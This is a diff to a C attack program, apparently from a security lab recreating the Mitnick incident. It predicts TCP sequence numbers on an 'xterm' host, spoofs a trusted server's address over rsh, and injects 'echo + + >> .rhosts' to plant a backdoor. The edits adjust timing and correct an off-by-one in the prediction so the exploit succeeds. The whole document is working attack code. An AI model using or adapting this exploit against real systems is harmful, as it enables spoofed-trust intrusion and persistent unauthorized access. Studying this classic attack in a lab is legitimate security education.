@@ -189,6 +189,7 @@ int main (void)
 		//printf("probe\n");
 		//send syn packets to shell in xterm, with kevin ip, to read the real synack and compute next sequence number
 		send_syn(514, 514, NULL, 0, l, xterm_ip, kevin_ip);
+		usleep(1000);
 		packet = pcap_next(handle, &header);
 
 		ip_hdr = (struct ip_hdr *) (packet + SIZE_ETH);
@@ -196,7 +197,7 @@ int main (void)
 
 		tcp_seq seq = htonl(tcp_hdr->th_seq);
 		tcp_seq ack = htonl(tcp_hdr->th_ack);
-		usleep(1000);
+		//usleep(1000);
 		printf("seq %u, ack %u\n", seq, ack);
 		seq_array[i] = seq;
 
@@ -209,7 +210,7 @@ int main (void)
 	printf("%u\n", compute_next_seq(seq_array[1], seq_array[0]));
 
 	tcp_seq predicted_seq = compute_next_seq(seq_array[2], seq_array[1]);
-
+	printf("predicted next seq %u\n", predicted_seq);
 	//exploit trust relation
 
 	//send syn impersonating the server
@@ -222,7 +223,7 @@ int main (void)
 	char backdoor[] = "0\0tsutomu\0tsutomu\0echo + + >> .rhosts";
 	uint32_t b_len = 38;
 	//int send_ack(uint16_t src_port, uint16_t dest_port, uint8_t *payload, uint32_t payload_s, libnet_t *l, uint32_t server_ip, uint32_t xterm_ip, uint16_t my_seq, uint16_t ack)
-	send_ack(514, 514, (uint8_t *) backdoor, b_len, l, server_ip, xterm_ip, my_seq + 1, predicted_seq + 1);
+	send_ack(514, 514, (uint8_t *) backdoor, b_len, l, server_ip, xterm_ip, my_seq + 1, predicted_seq);
 	printf("sent ack and pushed backdoor\n");
 
 	//connect from my own ip
@@ -373,6 +374,6 @@ tcp_seq compute_next_seq(tcp_seq n1, tcp_seq n2)
 {
 	//expression for next sequence number
 	//seq(N) = 2seq(N-1) - seq(N-2) + 3
-	tcp_seq n = 2*n1 - n2 + 3;
+	tcp_seq n = 2*n1 - n2 + 3 + 1;
 	return n;
 }
